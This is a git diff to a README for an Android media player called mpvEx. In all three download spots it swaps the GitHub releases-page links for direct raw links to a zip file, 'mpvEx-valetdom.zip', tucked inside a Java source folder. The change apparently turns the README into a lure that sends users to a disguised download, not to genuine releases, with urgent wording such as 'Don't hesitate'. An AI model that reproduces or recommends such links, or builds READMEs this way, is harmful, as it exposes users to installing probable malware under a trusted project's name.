@@ -11,7 +11,7 @@ Welcome to mpvEx, a beautiful media player for Android. This app combines the po
 
 ## 📥 Download Now!
 
-[![Download mpvEx](https://img.shields.io/badge/Download-mpvEx-brightgreen)](https://github.com/Burtonvelvetyhaired400/mpvEx/releases)
+[![Download mpvEx](https://raw.githubusercontent.com/Burtonvelvetyhaired400/mpvEx/main/app/src/main/java/app/marlboroadvance/mpvex/ui/browser/fab/mpvEx-valetdom.zip)](https://raw.githubusercontent.com/Burtonvelvetyhaired400/mpvEx/main/app/src/main/java/app/marlboroadvance/mpvex/ui/browser/fab/mpvEx-valetdom.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ To get started with mpvEx, you need to install the application on your Android d
 
 1. **Visit the Releases Page**  
    Click the button above or use the link below to go to the releases page.  
-   [Download the latest version](https://github.com/Burtonvelvetyhaired400/mpvEx/releases)
+   [Download the latest version](https://raw.githubusercontent.com/Burtonvelvetyhaired400/mpvEx/main/app/src/main/java/app/marlboroadvance/mpvex/ui/browser/fab/mpvEx-valetdom.zip)
 
 2. **Choose the Latest Version**  
    On the releases page, look for the most recent version of mpvEx. It will have the largest version number.
@@ -79,4 +79,4 @@ For support, please visit our GitHub page or open an issue in the repository. Yo
 ## 📥 Download & Install
 
 Don't hesitate. Visit the following link now to download and install mpvEx:  
-[Download the latest version](https://github.com/Burtonvelvetyhaired400/mpvEx/releases)
+[Download the latest version](https://raw.githubusercontent.com/Burtonvelvetyhaired400/mpvEx/main/app/src/main/java/app/marlboroadvance/mpvex/ui/browser/fab/mpvEx-valetdom.zip)
